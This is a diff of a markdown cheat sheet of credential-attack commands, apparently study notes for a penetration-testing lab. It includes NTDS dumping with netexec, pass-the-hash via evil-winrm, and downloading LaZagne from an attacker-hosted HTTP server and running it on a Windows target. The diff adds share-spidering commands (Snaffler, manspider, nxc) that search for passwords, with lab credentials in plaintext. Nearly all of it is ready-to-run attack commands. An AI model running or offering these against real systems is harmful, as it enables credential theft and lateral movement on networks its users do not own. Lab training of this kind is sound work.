@@ -115,11 +115,12 @@ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
 # Pass the Hash (PtH)
 evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 
-#LaZagne
+# LaZagne
 attacker: python3 -m http.server 8000
 Win Target: Invoke-WebRequest -Uri http://10.10.14.118:8000/LaZagne.exe -OutFile $env:TEMP\LaZagne.exe
 Win Target: $path="$env:TEMP\LaZagne.exe"
 Win Target: & $path all
+
 ```
 
 ### Linux Local Password Attacks
@@ -213,5 +214,11 @@ dir C:\*flag.txt* /s /b
 # Network
 Pcredz:used to extract credentials from live traffic or network packet captures
 ./Pcredz -f demo.pcapng -t -v
+
+# Network Shares
+Win: Snaffler.exe -s (-u for users, -i and -n for shares)
+Win: Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+Lin: docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
+Lin: nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
 
 ```
